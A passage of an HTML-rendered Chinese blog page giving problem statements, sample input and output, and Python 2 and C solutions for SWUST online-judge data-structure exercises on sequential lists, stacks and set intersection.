class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sqlist la,*lb;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    </span><br><span class="line">    initlist(la);</span><br><span class="line">    initlist(lb);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    creatlist(la,n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;m);</span><br><span class="line">    creatlist(lb,m);</span><br><span class="line">    </span><br><span class="line">    combinelist(la,lb);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div><h1 id="1038-顺序表中重复数据的删除"><a href="#1038-顺序表中重复数据的删除" class="headerlink" title="[1038] 顺序表中重复数据的删除"></a>[1038] 顺序表中重复数据的删除</h1><div class="tabs" id="1038"><ul class="nav-tabs"><li class="tab active"><a href="#1038-1">思路</a></li><li class="tab"><a href="#1038-2">题目描述</a></li><li class="tab"><a href="#1038-3">python代码实现</a></li><li class="tab"><a href="#1038-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="1038-1"><div class="note default"><blockquote><br><p>查重</p><br></blockquote></div></div><div class="tab-pane" id="1038-2"><p><a href="http://acm.swust.edu.cn/#/problems/1038/-1?_k=7uo5sl" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>将存储在顺序表中的长度为n的线性表中指定的数据全部删除。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为顺序表的长度n； 第二行为顺序表中的数据元素； 第三行为指定要删除的元素值。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>如果表不空，输出删除指定值后的线性表；如果删除后表空，则输出-1。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">11</span> <span class="number">22</span> <span class="number">33</span> <span class="number">44</span> <span class="number">44</span> <span class="number">55</span> <span class="number">44</span> <span class="number">66</span></span><br><span class="line"><span class="number">44</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11</span> <span class="number">22</span> <span class="number">33</span> <span class="number">55</span> <span class="number">66</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1038-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">a = []</span><br><span class="line">n = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>,raw_input().split()))</span><br><span class="line">x = <span class="keyword">int</span>(input())</span><br><span class="line">b = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i in range(len(a)):</span><br><span class="line">    <span class="keyword">if</span> x != a[i]:</span><br><span class="line">        print a[i],</span><br><span class="line">        b = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">    sys.<span class="built_in">stdout</span>.write(<span class="string">“-1”</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1038-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initlist</span><span class="params">(sqlist <em>&amp;l)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    l=(sqlist )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqlist));</span><br><span class="line">    l-&gt;length=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(sqlist <em>&amp;l,<span class="keyword">int</span> n)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;l-&gt;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    l-&gt;length=n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delelist</span><span class="params">(sqlist l,<span class="keyword">int</span> e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;l-&gt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(l-&gt;data[i]!=e)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">“%d “</span>,l-&gt;data[i]);</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">“-1”</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sqlist *la;</span><br><span class="line">    <span class="keyword">int</span> n,e;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    initlist(la);</span><br><span class="line">    creatlist(la,n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;e);</span><br><span class="line">    delelist(la,e);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div><h1 id="1044-顺序栈基本操作的实现"><a href="#1044-顺序栈基本操作的实现" class="headerlink" title="[1044] 顺序栈基本操作的实现"></a>[1044] 顺序栈基本操作的实现</h1><div class="tabs" id="1044"><ul class="nav-tabs"><li class="tab active"><a href="#1044-1">思路</a></li><li class="tab"><a href="#1044-2">题目描述</a></li><li class="tab"><a href="#1044-3">python代码实现</a></li><li class="tab"><a href="#1044-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="1044-1"><div class="note default"><blockquote><br><p>入栈，出栈，栈顶</p><br></blockquote></div></div><div class="tab-pane" id="1044-2"><p><a href="http://acm.swust.edu.cn/#/problems/1044/-1?_k=nzgn24" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>编程实现顺序栈的初始化、入栈、出栈、取栈顶元素和计算栈中元素个数等基本操作。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为入栈元素的个数； 第二行依次为入栈的元素； 出栈操作的次数n.</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>输出n次出栈后的栈顶元素值。如果是空栈，输出-1.</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1044-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">n = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>, raw_input().split()))</span><br><span class="line">m = <span class="keyword">int</span>(input())</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> m:</span><br><span class="line">    a.pop()</span><br><span class="line">    m -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(a) is <span class="keyword">not</span> <span class="number">0</span>:</span><br><span class="line">    sys.stdout.write(‘%d’%a[len(a)-1])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sys.<span class="built_in">stdout</span>.write(<span class="string">“-1”</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1044-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">int</span> top;</span><br><span class="line">&#125;sqstack;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initstack</span><span class="params">(sqstack <em>&amp;s)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s=(sqstack )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqstack));</span><br><span class="line">    s-&gt;top=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(sqstack <em>&amp;s,<span class="keyword">int</span> e)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">    s-&gt;data[s-&gt;top]=e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">stackempty</span><span class="params">(sqstack s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s-&gt;top==<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">pop</span><span class="params">(sqstack <em>&amp;s,<span class="keyword">int</span> &amp;e)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top==<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    e=s-&gt;data[s-&gt;top];</span><br><span class="line">    s-&gt;top–;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sqstack s;</span><br><span class="line">    <span class="keyword">int</span> temp,e;</span><br><span class="line">    initstack(s);</span><br><span class="line">    <span class="keyword">int</span> n,a;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;a);</span><br><span class="line">        push(s,a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;temp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=temp;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pop(s,e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(temp&gt;=n)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“-1”</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(stackempty)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“%d”</span>,e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div><h1 id="1045-集合的交运算的实现"><a href="#1045-集合的交运算的实现" class="headerlink" title="[1045] 集合的交运算的实现"></a>[1045] 集合的交运算的实现</h1><div class="tabs" id="1045"><ul class="nav-tabs"><li class="tab active"><a href="#1045-1">思路</a></li><li class="tab"><a href="#1045-2">题目描述</a></li><li class="tab"><a href="#1045-3">python代码实现</a></li><li class="tab"><a href="#1045-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="1045-1"><div class="note default"><blockquote><br><p>交运算</p><br></blockquote></div></div><div class="tab-pane" id="1045-2"><p><a href="http://acm.swust.edu.cn/#/problems/1045/-1?_k=ghtmw4" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>假设有两个集合 A 和 B 分别用两个线性表 LA 和 LB 表示，即线性表中的数据元素即为集合中的成员。编程实现集合A和集合B的交运算。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为集合A的数据元素个数n;<br>第二行输入n个集合A的数据元素 ;<br>第三行为集合B的数据元素的个数；<br>第四行输入m个集合B的数据元素</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>A和B的交集</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">0</span> <span class="number">5</span> <span class="number">6</span> <span class="number">3</span> <span class="number">8</span> <span class="number">7</span> <span class="number">9</span> <span class="number">10</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span> <span class="number">4</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">5</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span> <span class="number">3</span> <span class="number">8</span> <span class="number">7</span> <span class="number">9</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1045-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a = []</span><br><span class="line">n1 = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>,raw_input().split()))</span><br><span class="line"></span><br><span class="line">b = []</span><br><span class="line">n2 = <span class="keyword">int</span>(input())</span><br><span class="line">b = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>,raw_input().split()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(a)):</span><br><span class="line">    <span class="keyword">for</span> j in range(len(b)):</span><br><span class="line">        <span class="keyword">if</span> a[i] == b[j]:</span><br><span class="line">            print a[i],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1045-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> elemtype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    elemtype data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initlist</span><span class="params">(sqlist <em>&amp;l)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    l=(sqlist )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqlist));</span><br><span class="line">    l-&gt;length=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(sqlist <em>&amp;l,<span class="keyword">int</span> n)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;l-&gt;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    l-&gt;length=n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">holist</span><span class="params">(sqlist &amp;l,sqlist <em>&amp;s)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s-&gt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;l-&gt;length;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(l-&gt;data[j]==s-&gt;data[i])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">“%d “</span>,l-&gt;data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sqlist la,*lb;</span><br><span class="line">    <span class="keyword">int</span> m,n;</span><br><span class="line">    initlist(la);</span><br><span class="line">    initlist(lb);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;m);</span><br><span class="line">    creatlist(la,m);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    creatlist(lb,n);</span><br><span class="line">    </span><br><span class="line">    holist(la,lb);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></div></div><h1 id="1102-顺序表上数据的划分问题的实现"><a href="#1102-顺序表上数据的划分问题的实现" class="headerlink" title="[1102] 顺序表上数据的划分问题的实现"></a>[1102] 顺序表上数据的划分问题的实现</h1><div class="tabs" id="1102"><ul class="nav-tabs"><li class="tab active"><a href="#1102-1">思路</a></li><li class="tab"><a href="#1102-2">题目描述</a></li><li class="tab"><a href="#1102-3">python代码实现</a></li><li class="tab"><a href="#1102-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="1102-1"><div class="note default"><blockquote><br><p>比较</p><br></blockquote></div></div><div class="tab-pane" id="1102-2"><p><a href="http://acm.swust.edu.cn/#/problems/1102/-1?_k=sgryzy" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>建立一个顺序表L，然后以第一个为分界，将所有小于等于它的元素移到该元素的前面，将所有大于它的元素移到该元素的后面。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>顺序表长度n；<br>顺序表中的数据元素。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>移动后的数据元素。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">32</span> <span class="number">5</span> <span class="number">22</span> <span class="number">43</span> <span class="number">23</span> <span class="number">56</span> <span class="number">54</span> <span class="number">57</span> <span class="number">11</span> <span class="number">25</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">25</span> <span class="number">11</span> <span class="number">23</span> <span class="number">22</span> <span class="number">5</span> <span class="number">32</span> <span class="number">43</span> <span class="number">56</span> <span class="number">54</span> <span class="number">57</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1102-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">n = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>, raw_input().split()))</span><br><span class="line"></span><br><span class="line">g = a[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>, len(a)):</span><br><span class="line">    <span class="keyword">if</span> a[i] &lt; g:</span><br><span class="line">        k = a[i]</span><br><span class="line">        a.pop(i)</span><br><span class="line">        a.insert(<span class="number">0</span>, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k in a:</span><br><span class="line">    print k,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1102-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> elemtype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    elemtype data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span 